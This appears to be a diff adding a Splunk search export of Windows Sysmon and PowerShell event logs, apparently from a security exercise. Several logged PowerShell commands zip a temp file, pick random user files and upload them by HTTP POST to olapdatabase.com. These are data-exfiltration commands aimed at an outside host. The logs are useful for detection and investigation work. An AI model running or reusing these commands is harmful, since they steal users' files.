@@ -1,0 +1,210 @@
+ 11 events (10/16/26 12:57:00.000 PM to 10/16/26 1:10:00.000 PM) No Event Sampling JobVerbose Mode
+Events (11)
+Patterns
+Statistics
+Visualization
+Format Timeline
+ Zoom Out  Zoom to Selection  Deselect1 minute per column
+List
+ Format 
+20 Per Page
+Hide FieldsAll Fields
+SELECTED FIELDS
+ahost 1
+asource 2
+asourcetype 1
+INTERESTING FIELDS
+acategory 2
+aCommandLine 4
+aCompany 1
+aComputerName 1
+aCurrentDirectory 1
+aDescription 2
+adest 1
+advc 1
+advc_nt_host 1
+aevent_creation_time 5
+aevent_description 1
+#event_id 7
+#event_type 1
+#EventCode 2
+#EventType 2
+aeventtype 3
+afile_company 1
+afile_description 2
+afile_directory 1
+afile_name 2
+afile_product 1
+afile_version 2
+aFileVersion 2
+aHashes 2
+ahost_fqdn 1
+ahost_name 1
+#id 11
+aImage 2
+aindex 1
+aIntegrityLevel 1
+aKeywords 1
+#linecount 2
+aLogName 2
+aLogonGuid 1
+aLogonId 1
+aMessage 11
+aOpCode 2
+aoriginal_file_name 2
+aOriginalFileName 2
+aParentCommandLine 3
+aParentImage 2
+aParentProcessGuid 3
+#ParentProcessId 3
+aprocess_command_line 4
+aprocess_guid 5
+#process_id 5
+aprocess_integrity_level 1
+aprocess_name 2
+aprocess_parent_command_line 3
+aprocess_parent_guid 3
+#process_parent_id 3
+aprocess_parent_name 2
+aprocess_parent_path 2
+aprocess_path 2
+aProcessGuid 5
+#ProcessId 5
+aProduct 1
+apunct 3
+#RecordNumber 11
+aScript 11
+aScriptBlock_ID 6
+aseverity 1
+#severity_id 2
+aSid 1
+#SidType 1
+asignature 1
+#signature_id 2
+aSourceName 2
+asplunk_server 1
+atag 1
+atag::eventtype 1
+atarget_process_name 1
+aTaskCategory 2
+#TerminalSessionId 1
+aType 2
+aUser 2
+auser_logon_guid 1
+auser_logon_id 1
+auser_name 2
+#user_session_id 1
+aUtcTime 5
+avendor_product 1
+ Extract New Fields
+Time	Event
+10/16/26
+1:05:57.000 PM	
+10/16/2026 01:05:57 PM
+LogName=Microsoft-Windows-Sysmon/Operational
+... 32 lines omitted ...
+ParentProcessId: 13928
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $zipfile = \"C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp.zip\"; Invoke-RestMethod -Uri olapdatabase.com/ -Method Post -InFile $zipfile;echo \" \"}
+Show all 37 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-Sysmon/Operationalsourcetype = WinEventLog
+10/16/26
+1:05:57.000 PM	
+10/16/2026 01:05:57 PM
+... 13 lines omitted ...
+Message=Creating Scriptblock text (1 of 1):
+{$command = quser; $string = Out-String -inputobject $command; $username = $string.split("`n>")[2].split()[0]; $zipfile = "C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp.zip"; Invoke-RestMethod -Uri olapdatabase.com/ -Method Post -InFile $zipfile;echo " "}
+
+ScriptBlock ID: 4a1977d9-bd05-4766-ad12-002998c988c9
+Show all 19 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-PowerShell/Operationalsourcetype = WinEventLog
+10/16/26
+1:05:57.000 PM	
+10/16/2026 01:05:57 PM
+... 13 lines omitted ...
+Message=Creating Scriptblock text (1 of 1):
+&{$command = quser; $string = Out-String -inputobject $command; $username = $string.split("`n>")[2].split()[0]; $zipfile = "C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp.zip"; Invoke-RestMethod -Uri olapdatabase.com/ -Method Post -InFile $zipfile;echo " "}
+
+ScriptBlock ID: 7a967932-b700-4745-aa8d-3726005d81b2
+Show all 19 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-PowerShell/Operationalsourcetype = WinEventLog
+10/16/26
+1:05:56.000 PM	
+10/16/2026 01:05:56 PM
+... 22 lines omitted ...
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $zipfile = \"C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp.zip\"; Invoke-RestMethod -Uri olapdatabase.com/ -Method Post -InFile $zipfile;echo \" \"}
+CurrentDirectory: C:\Windows\system32\
+Show all 37 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-Sysmon/Operationalsourcetype = WinEventLog
+10/16/26
+1:05:25.000 PM	
+10/16/2026 01:05:25 PM
+... 13 lines omitted ...
+Message=Creating Scriptblock text (1 of 1):
+{$files = @(); gci c:\users -exclude "Public" | gci -Recurse -exclude "AppData","*.lnk","*.url" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Invoke-RestMethod -Uri http://olapdatabase.com// -Method Post -InFile $file;$file}
+
+ScriptBlock ID: 3f392af9-8fba-499f-bb65-5c962958e1b6
+Show all 19 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-PowerShell/Operationalsourcetype = WinEventLog
+10/16/26
+1:05:25.000 PM	
+10/16/2026 01:05:25 PM
+... 13 lines omitted ...
+Message=Creating Scriptblock text (1 of 1):
+&{$files = @(); gci c:\users -exclude "Public" | gci -Recurse -exclude "AppData","*.lnk","*.url" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Invoke-RestMethod -Uri http://olapdatabase.com// -Method Post -InFile $file;$file}
+
+ScriptBlock ID: 2740e58e-f8c4-46b4-ac4e-db0663e2e81e
+Show all 19 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-PowerShell/Operationalsourcetype = WinEventLog
+10/16/26
+1:05:25.000 PM	
+10/16/2026 01:05:25 PM
+... 22 lines omitted ...
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell &{$files = @(); gci c:\users -exclude \"Public\" | gci -Recurse -exclude \"AppData\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Invoke-RestMethod -Uri http://olapdatabase.com// -Method Post -InFile $file;$file}
+CurrentDirectory: C:\Windows\system32\
+Show all 37 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-Sysmon/Operationalsourcetype = WinEventLog
+10/16/26
+1:04:54.000 PM	
+10/16/2026 01:04:54 PM
+... 13 lines omitted ...
+Message=Creating Scriptblock text (1 of 1):
+{$command = quser; $string = Out-String -inputobject $command; $username = $string.split("`n>")[2].split()[0]; $tmpfile = "C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp"; Compress-Archive -Path $tmpfile -DestinationPath "$tmpfile.zip"; echo "success" }
+
+ScriptBlock ID: 25b8d24e-afd9-4947-991a-c4e268a08d84
+Show all 19 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-PowerShell/Operationalsourcetype = WinEventLog
+10/16/26
+1:04:54.000 PM	
+10/16/2026 01:04:54 PM
+... 13 lines omitted ...
+Message=Creating Scriptblock text (1 of 1):
+&{$command = quser; $string = Out-String -inputobject $command; $username = $string.split("`n>")[2].split()[0]; $tmpfile = "C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp"; Compress-Archive -Path $tmpfile -DestinationPath "$tmpfile.zip"; echo "success" }
+
+ScriptBlock ID: c791003c-8e5d-4333-a21b-56a493f4859c
+Show all 19 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-PowerShell/Operationalsourcetype = WinEventLog
+10/16/26
+1:04:54.000 PM	
+10/16/2026 01:04:54 PM
+LogName=Microsoft-Windows-Sysmon/Operational
+... 32 lines omitted ...
+ParentProcessId: 11844
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp\"; Compress-Archive -Path $tmpfile -DestinationPath \"$tmpfile.zip\"; echo \"success\" }
+Show all 37 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-Sysmon/Operationalsourcetype = WinEventLog
+10/16/26
+1:04:53.000 PM	
+10/16/2026 01:04:53 PM
+... 22 lines omitted ...
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\users\$username\appdata\local\temp\ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.tmp\"; Compress-Archive -Path $tmpfile -DestinationPath \"$tmpfile.zip\"; echo \"success\" }
+CurrentDirectory: C:\Windows\system32\
+Show all 37 lines
+host = br-win10-1source = WinEventLog:Microsoft-Windows-Sysmon/Operationalsourcetype = WinEventLog
